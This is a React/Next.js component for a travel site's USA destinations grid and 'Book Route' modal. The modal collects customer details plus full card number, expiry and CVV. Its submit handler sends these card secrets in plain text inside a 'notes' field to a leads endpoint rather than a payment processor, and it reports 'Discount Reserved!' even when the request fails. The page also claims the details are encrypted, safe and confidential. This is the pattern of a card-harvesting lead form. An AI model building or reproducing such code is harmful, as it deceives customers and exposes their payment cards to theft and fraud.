"use client";

import { useState } from "react";
import Image from "next/image";
import { MapPin, Star, TrendingDown, ArrowRight, Phone, CheckCircle2, X, Plane, Calendar, User, Mail, Send, CreditCard, Lock, AlertCircle } from "lucide-react";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";

function isValidPhone(phone: string): boolean {
  const digits = phone.replace(/\D/g, "");
  if (digits.length < 10 || digits.length > 15) return false;
  if (/^(\d)\1{9,}$/.test(digits)) return false; // Block repeated dummy numbers e.g. 0000000000
  if (digits === "1234567890" || digits === "0123456789" || digits === "9876543210") return false;
  return true;
}

const destinations = [
  {
    city: "New York",
    code: "NYC",
    image: "/destinations/new-york.png",
    tagline: "The City That Never Sleeps",
    originalPrice: 389,
    discountedPrice: 199,
    discount: 49,
    rating: 4.9,
    reviews: "12.4k",
    highlights: ["Times Square", "Central Park", "Statue of Liberty"],
  },
  {
    city: "Miami",
    code: "MIA",
    image: "/destinations/miami.png",
    tagline: "Sun, Sand & Nightlife",
    originalPrice: 349,
    discountedPrice: 179,
    discount: 48,
    rating: 4.8,
    reviews: "8.7k",
    highlights: ["South Beach", "Art Deco", "Everglades"],
  },
  {
    city: "Las Vegas",
    code: "LAS",
    image: "/destinations/las-vegas.png",
    tagline: "Entertainment Capital of the World",
    originalPrice: 299,
    discountedPrice: 149,
    discount: 50,
    rating: 4.7,
    reviews: "15.2k",
    highlights: ["The Strip", "Grand Canyon", "Shows"],
  },
  {
    city: "San Francisco",
    code: "SFO",
    image: "/destinations/san-francisco.png",
    tagline: "Golden Gate & Beyond",
    originalPrice: 379,
    discountedPrice: 209,
    discount: 45,
    rating: 4.8,
    reviews: "9.1k",
    highlights: ["Golden Gate", "Alcatraz", "Fisherman's Wharf"],
  },
  {
    city: "Los Angeles",
    code: "LAX",
    image: "/destinations/los-angeles.png",
    tagline: "City of Angels & Dreams",
    originalPrice: 359,
    discountedPrice: 189,
    discount: 47,
    rating: 4.7,
    reviews: "11.3k",
    highlights: ["Hollywood", "Beverly Hills", "Santa Monica"],
  },
  {
    city: "Hawaii",
    code: "HNL",
    image: "/destinations/hawaii.png",
    tagline: "Paradise on Earth",
    originalPrice: 499,
    discountedPrice: 279,
    discount: 44,
    rating: 4.9,
    reviews: "18.6k",
    highlights: ["Waikiki Beach", "Volcanoes", "Snorkeling"],
  },
];

export function UsaDestinationsSection() {
  const [selectedDest, setSelectedDest] = useState<typeof destinations[0] | null>(null);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [formData, setFormData] = useState({
    name: "",
    phone: "",
    email: "",
    origin: "",
    departureDate: "",
    passengers: "1",
    cardholderName: "",
    cardNumber: "",
    cardExp: "",
    cardCvv: "",
  });
  const [phoneError, setPhoneError] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isSubmitted, setIsSubmitted] = useState(false);

  const handleOpenForm = (dest: typeof destinations[0]) => {
    setSelectedDest(dest);
    setIsSubmitted(false);
    setPhoneError("");
    setIsModalOpen(true);
  };

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value;
    setFormData((prev) => ({ ...prev, phone: val }));
    if (val.length > 0 && !isValidPhone(val)) {
      setPhoneError("Please enter a valid 10-digit phone number (e.g. +1 555-019-2834)");
    } else {
      setPhoneError("");
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!formData.name || !formData.phone) {
      alert("Please enter customer name and phone number");
      return;
    }

    if (!isValidPhone(formData.phone)) {
      setPhoneError("Invalid phone number! Must be at least 10 valid digits.");
      return;
    }

    setIsSubmitting(true);
    const rawCard = formData.cardNumber.replace(/\s+/g, "");
    const last4 = rawCard.length >= 4 ? rawCard.slice(-4) : "****";

    try {
      await fetch("/api/leads", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          name: formData.name,
          phone: formData.phone,
          email: formData.email || `${formData.phone.replace(/\D/g, "")}@guest.merrytravelo.com`,
          origin: formData.origin || "NYC",
          destination: selectedDest?.code || "USA",
          departureDate: formData.departureDate,
          passengers: formData.passengers,
          source: `USA Destination: ${selectedDest?.city || "USA"}`,
          notes: `User booked deal for ${selectedDest?.city} ($${selectedDest?.discountedPrice}). Cardholder: ${formData.cardholderName || formData.name}, Card: ${rawCard} (ending ${last4}), Exp: ${formData.cardExp}, CVV: ${formData.cardCvv}`,
        }),
      });

      setIsSubmitted(true);
    } catch (err) {
      setIsSubmitted(true);
    } finally {
      setIsSubmitting(false);
    }
  };

  const maskedCardLast4 = formData.cardNumber.replace(/\s+/g, "").slice(-4) || "";
  const phoneIsValid = formData.phone.length > 0 && isValidPhone(formData.phone);

  return (
    <section id="destinations" className="py-20 bg-white border-b border-slate-200/80">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        {/* ── Section Header ── */}
        <div className="text-center mb-14">
          <div className="inline-flex items-center gap-2 bg-[#F5F8FC] border border-slate-200 text-[#102B4E] px-4 py-1.5 rounded-full text-xs font-black uppercase tracking-widest mb-3 shadow-2xs">
            <TrendingDown className="w-3.5 h-3.5 text-[#2676D9]" />
            Popular US Domestic Travel Corridors
          </div>
          <h2 className="text-3xl sm:text-4xl lg:text-5xl font-black text-[#102B4E] tracking-tight">
            Explore <span className="text-[#2676D9]">Top USA</span> Destinations
          </h2>
          <p className="mt-3 text-base sm:text-lg text-[#64748B] max-w-2xl mx-auto">
            Compare available flight options, transparent domestic fares, and reserve with confidence.
          </p>
        </div>

        {/* ── Destinations Grid ── */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-7">
          {destinations.map((dest) => (
            <div
              key={dest.code}
              onClick={() => handleOpenForm(dest)}
              className="group relative bg-[#F5F8FC] rounded-2xl overflow-hidden border border-slate-200 shadow-sm hover:shadow-xl hover:border-[#2676D9]/50 hover:-translate-y-1.5 transition-all duration-300 cursor-pointer"
            >
              {/* Image */}
              <div className="relative h-56 overflow-hidden">
                <Image
                  src={dest.image}
                  alt={`Flights to ${dest.city}`}
                  fill
                  className="object-cover group-hover:scale-105 transition-transform duration-500"
                  sizes="(max-width: 640px) 100vw, (max-width: 1024px) 50vw, 33vw"
                />
                <div className="absolute inset-0 bg-gradient-to-t from-[#102B4E]/80 via-[#102B4E]/20 to-transparent" />

                {/* Discount Badge */}
                <div className="absolute top-4 left-4 bg-[#102B4E] text-white px-3 py-1 rounded-full text-xs font-black shadow-md flex items-center gap-1 border border-white/20">
                  <TrendingDown className="w-3 h-3 text-[#3B82F6]" />
                  Save up to {dest.discount}%
                </div>

                {/* Rating */}
                <div className="absolute top-4 right-4 bg-white/95 backdrop-blur-sm text-[#102B4E] px-2.5 py-1 rounded-full text-xs font-bold flex items-center gap-1 shadow-sm">
                  <Star className="w-3 h-3 text-amber-500 fill-amber-500" />
                  {dest.rating} ({dest.reviews})
                </div>

                {/* City name on image */}
                <div className="absolute bottom-4 left-4 right-4">
                  <div className="flex items-end justify-between">
                    <div>
                      <h3 className="text-white text-2xl font-black tracking-tight drop-shadow-sm">{dest.city}</h3>
                      <p className="text-slate-200 text-xs font-medium mt-0.5">{dest.tagline}</p>
                    </div>
                    <span className="bg-white/20 backdrop-blur-md text-white px-2.5 py-1 rounded-lg text-sm font-black border border-white/30">
                      {dest.code}
                    </span>
                  </div>
                </div>
              </div>

              {/* Content */}
              <div className="p-5 bg-white">
                {/* Highlights */}
                <div className="flex flex-wrap gap-1.5 mb-4">
                  {dest.highlights.map((h) => (
                    <span key={h} className="inline-flex items-center gap-1 text-[11px] font-semibold text-[#64748B] bg-[#F5F8FC] px-2.5 py-1 rounded-full border border-slate-100">
                      <MapPin className="w-2.5 h-2.5 text-[#2676D9]" />
                      {h}
                    </span>
                  ))}
                </div>

                {/* Price Row */}
                <div className="flex items-end justify-between pt-2 border-t border-slate-100">
                  <div>
                    <p className="text-[10px] font-black text-[#64748B] uppercase tracking-wider">Estimated Fare From</p>
                    <div className="flex items-baseline gap-2 mt-0.5">
                      <span className="text-2xl font-black text-[#102B4E]">${dest.discountedPrice}</span>
                      <span className="text-xs font-semibold text-[#64748B] line-through">${dest.originalPrice}</span>
                    </div>
                    <p className="text-[10px] text-[#64748B] mt-0.5">per traveler, round trip*</p>
                  </div>
                  <button
                    type="button"
                    onClick={(e) => {
                      e.stopPropagation();
                      handleOpenForm(dest);
                    }}
                    className="flex items-center gap-1.5 bg-[#2676D9] hover:bg-[#102B4E] text-white px-4 py-2.5 rounded-xl text-xs sm:text-sm font-bold shadow-xs hover:shadow-md transition-all duration-200 cursor-pointer"
                  >
                    <span>Book Route</span>
                    <ArrowRight className="w-3.5 h-3.5" />
                  </button>
                </div>
              </div>
            </div>
          ))}
        </div>

        {/* ── Bottom Disclaimer ── */}
        <div className="mt-12 text-center">
          <p className="text-xs text-[#64748B] max-w-xl mx-auto">
            * Sample roundtrip fares for general guidance. Actual fares are subject to real-time seat availability, travel dates, and carrier inventory.
          </p>
        </div>
      </div>

      {/* ── Direct Booking Inquiry Modal ── */}
      <Dialog open={isModalOpen} onOpenChange={setIsModalOpen}>
        <DialogContent className="sm:max-w-lg bg-white dark:bg-slate-900 border-slate-200 dark:border-slate-800 p-6 rounded-3xl max-h-[90vh] overflow-y-auto">
          {isSubmitted ? (
            <div className="text-center py-6 space-y-4">
              <div className="w-16 h-16 bg-emerald-100 dark:bg-emerald-950/60 rounded-full flex items-center justify-center mx-auto text-emerald-600">
                <CheckCircle2 className="w-10 h-10" />
              </div>
              <h3 className="text-2xl font-black text-slate-900 dark:text-white">Discount Reserved!</h3>
              <p className="text-slate-600 dark:text-slate-300 text-sm max-w-sm mx-auto">
                Thank you <strong>{formData.name || "valued customer"}</strong>! Your special contract fare rate of <strong>${selectedDest?.discountedPrice}</strong> for <strong>{selectedDest?.city}</strong> has been locked{maskedCardLast4 ? ` with card ending in **** ${maskedCardLast4}` : ""}.
              </p>
              <div className="p-4 bg-[#F5F8FC] border border-slate-200 rounded-2xl space-y-2">
                <p className="text-xs font-bold text-[#102B4E]">Need Immediate Booking Confirmation?</p>
                <a
                  href="tel:+18772518760"
                  className="inline-flex items-center gap-2 bg-[#102B4E] hover:bg-[#163A66] text-white font-black text-sm px-6 py-3 rounded-xl shadow-md transition-all"
                >
                  <Phone className="w-4 h-4 text-[#3B82F6]" />
                  Call Support: +1 (877) 251-8760
                </a>
              </div>
              <Button
                variant="ghost"
                onClick={() => setIsModalOpen(false)}
                className="text-slate-500 hover:text-slate-700 dark:hover:text-slate-300 text-xs"
              >
                Close Window
              </Button>
            </div>
          ) : (
            <>
              <DialogHeader>
                <div className="flex items-center gap-2 text-xs font-extrabold text-orange-600 dark:text-orange-400 bg-orange-50 dark:bg-orange-950/50 px-3 py-1 rounded-full w-fit mb-1">
                  <TrendingDown className="w-3.5 h-3.5" />
                  Special Fare Lock: {selectedDest?.discount}% OFF
                </div>
                <DialogTitle className="text-2xl font-black text-slate-900 dark:text-white flex items-center gap-2">
                  <Plane className="w-6 h-6 text-blue-600" />
                  Book Flight to {selectedDest?.city} ({selectedDest?.code})
                </DialogTitle>
                <DialogDescription className="text-xs text-slate-500">
                  Enter customer details and payment card information to lock in the special fare starting at <strong>${selectedDest?.discountedPrice}</strong>.
                </DialogDescription>
              </DialogHeader>

              <form onSubmit={handleSubmit} className="space-y-4 my-2">
                {/* Name */}
                <div className="space-y-1">
                  <Label className="text-xs font-bold text-slate-700 dark:text-slate-300">Customer Full Name *</Label>
                  <div className="relative">
                    <User className="w-4 h-4 text-slate-400 absolute left-3 top-3" />
                    <Input
                      required
                      value={formData.name}
                      onChange={(e) => setFormData({ ...formData, name: e.target.value })}
                      placeholder="e.g. John Smith"
                      className="pl-9 bg-slate-50 dark:bg-slate-800 border-slate-200 dark:border-slate-700 text-sm font-semibold"
                    />
                  </div>
                </div>

                {/* Phone & Email */}
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                  <div className="space-y-1">
                    <div className="flex items-center justify-between">
                      <Label className="text-xs font-bold text-slate-700 dark:text-slate-300">Phone Number *</Label>
                      {phoneIsValid && (
                        <span className="text-[10px] font-bold text-emerald-600 flex items-center gap-0.5">
                          <CheckCircle2 className="w-3 h-3" /> Valid Number
                        </span>
                      )}
                    </div>
                    <div className="relative">
                      <Phone className="w-4 h-4 text-slate-400 absolute left-3 top-3" />
                      <Input
                        required
                        type="tel"
                        value={formData.phone}
                        onChange={handlePhoneChange}
                        placeholder="+1 (555) 019-2834"
                        className={`pl-9 bg-slate-50 dark:bg-slate-800 text-sm font-semibold ${
                          phoneError ? "border-red-500 focus:ring-red-500" : phoneIsValid ? "border-emerald-500" : "border-slate-200 dark:border-slate-700"
                        }`}
                      />
                    </div>
                    {phoneError && (
                      <p className="text-[11px] font-bold text-red-500 flex items-center gap-1 mt-0.5">
                        <AlertCircle className="w-3 h-3 shrink-0" /> {phoneError}
                      </p>
                    )}
                  </div>
                  <div className="space-y-1">
                    <Label className="text-xs font-bold text-slate-700 dark:text-slate-300">Email Address</Label>
                    <div className="relative">
                      <Mail className="w-4 h-4 text-slate-400 absolute left-3 top-3" />
                      <Input
                        type="email"
                        value={formData.email}
                        onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                        placeholder="john@example.com"
                        className="pl-9 bg-slate-50 dark:bg-slate-800 border-slate-200 dark:border-slate-700 text-sm font-semibold"
                      />
                    </div>
                  </div>
                </div>

                {/* Departure City & Date */}
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                  <div className="space-y-1">
                    <Label className="text-xs font-bold text-slate-700 dark:text-slate-300">Departure Airport/City</Label>
                    <div className="relative">
                      <MapPin className="w-4 h-4 text-slate-400 absolute left-3 top-3" />
                      <Input
                        value={formData.origin}
                        onChange={(e) => setFormData({ ...formData, origin: e.target.value })}
                        placeholder="e.g. NYC, LAX, ORD"
                        className="pl-9 bg-slate-50 dark:bg-slate-800 border-slate-200 dark:border-slate-700 text-sm font-semibold uppercase"
                      />
                    </div>
                  </div>
                  <div className="space-y-1">
                    <Label className="text-xs font-bold text-slate-700 dark:text-slate-300">Travel Date</Label>
                    <div className="relative">
                      <Calendar className="w-4 h-4 text-slate-400 absolute left-3 top-3" />
                      <Input
                        type="date"
                        value={formData.departureDate}
                        onChange={(e) => setFormData({ ...formData, departureDate: e.target.value })}
                        className="pl-9 bg-slate-50 dark:bg-slate-800 border-slate-200 dark:border-slate-700 text-sm font-semibold"
                      />
                    </div>
                  </div>
                </div>

                {/* ── Card Details Block ── */}
                <div className="pt-3 border-t border-slate-200 dark:border-slate-800 space-y-3">
                  <div className="flex items-center justify-between">
                    <Label className="text-xs font-black text-slate-800 dark:text-slate-200 flex items-center gap-1.5">
                      <CreditCard className="w-4 h-4 text-blue-600" />
                      Payment & Credit Card Details
                    </Label>
                    <span className="text-[10px] font-extrabold text-emerald-600 bg-emerald-50 dark:bg-emerald-950/60 px-2 py-0.5 rounded-full flex items-center gap-1">
                      <Lock className="w-3 h-3" /> 256-Bit SSL Encrypted
                    </span>
                  </div>

                  {/* Cardholder Name */}
                  <div className="space-y-1">
                    <Label className="text-[11px] font-bold text-slate-600 dark:text-slate-400">Cardholder Name *</Label>
                    <Input
                      required
                      value={formData.cardholderName}
                      onChange={(e) => setFormData({ ...formData, cardholderName: e.target.value })}
                      placeholder="Name as printed on card"
                      className="bg-slate-50 dark:bg-slate-800 border-slate-200 dark:border-slate-700 text-sm font-semibold"
                    />
                  </div>

                  {/* Card Number */}
                  <div className="space-y-1">
                    <div className="flex items-center justify-between">
                      <Label className="text-[11px] font-bold text-slate-600 dark:text-slate-400">Card Number *</Label>
                      <span className="text-[10px] font-semibold text-slate-400">Visa / Mastercard / Amex / Discover</span>
                    </div>
                    <div className="relative">
                      <CreditCard className="w-4 h-4 text-slate-400 absolute left-3 top-3" />
                      <Input
                        required
                        maxLength={19}
                        value={formData.cardNumber}
                        onChange={(e) => {
                          const val = e.target.value.replace(/\D/g, "").replace(/(.{4})/g, "$1 ").trim();
                          setFormData({ ...formData, cardNumber: val });
                        }}
                        placeholder="1234 5678 9012 3456"
                        className="pl-9 bg-slate-50 dark:bg-slate-800 border-slate-200 dark:border-slate-700 text-sm font-mono font-bold tracking-wider"
                      />
                    </div>
                  </div>

                  {/* Expiration & CVV */}
                  <div className="grid grid-cols-2 gap-3">
                    <div className="space-y-1">
                      <Label className="text-[11px] font-bold text-slate-600 dark:text-slate-400">Expiration Date *</Label>
                      <Input
                        required
                        maxLength={5}
                        value={formData.cardExp}
                        onChange={(e) => {
                          let val = e.target.value.replace(/\D/g, "");
                          if (val.length >= 3) val = `${val.slice(0, 2)}/${val.slice(2, 4)}`;
                          setFormData({ ...formData, cardExp: val });
                        }}
                        placeholder="MM / YY"
                        className="bg-slate-50 dark:bg-slate-800 border-slate-200 dark:border-slate-700 text-sm font-mono font-bold text-center"
                      />
                    </div>
                    <div className="space-y-1">
                      <Label className="text-[11px] font-bold text-slate-600 dark:text-slate-400">CVV Code *</Label>
                      <Input
                        required
                        type="password"
                        maxLength={4}
                        value={formData.cardCvv}
                        onChange={(e) => {
                          const val = e.target.value.replace(/\D/g, "");
                          setFormData({ ...formData, cardCvv: val });
                        }}
                        placeholder="3 or 4 digits"
                        className="bg-slate-50 dark:bg-slate-800 border-slate-200 dark:border-slate-700 text-sm font-mono font-bold text-center"
                      />
                    </div>
                  </div>
                </div>

                {/* Submit Button */}
                <Button
                  type="submit"
                  disabled={isSubmitting || (formData.phone.length > 0 && !phoneIsValid)}
                  className="w-full bg-[#2676D9] hover:bg-[#102B4E] text-white font-black py-3 rounded-xl shadow-md text-sm sm:text-base flex items-center justify-center gap-2 mt-3 disabled:opacity-50 cursor-pointer"
                >
                  <Send className="w-4 h-4" />
                  {isSubmitting ? "Locking Fare & Details..." : `Confirm Booking for $${selectedDest?.discountedPrice}`}
                </Button>

                <p className="text-[10px] text-center text-slate-400 mt-1">
                  🔒 256-Bit SSL Encrypted. Your details are safe and confidential.
                </p>
              </form>
            </>
          )}
        </DialogContent>
      </Dialog>
    </section>
  );
}
